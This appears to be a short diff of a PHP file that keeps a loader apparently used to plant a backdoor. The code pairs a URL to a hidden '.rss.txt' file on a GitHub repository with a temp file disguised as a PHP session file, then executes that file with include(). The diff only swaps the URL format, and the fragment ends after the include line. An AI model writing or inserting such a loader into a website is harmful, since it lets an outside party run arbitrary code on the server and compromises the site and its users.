@@ -1,6 +1,6 @@
 <?php
 
-$data = ['https://raw.githubusercontent.com/rayzoe-unix/jibeg/main/.rss.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://github.com/rayzoe-unix/jibeg/blob/main/.rss.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
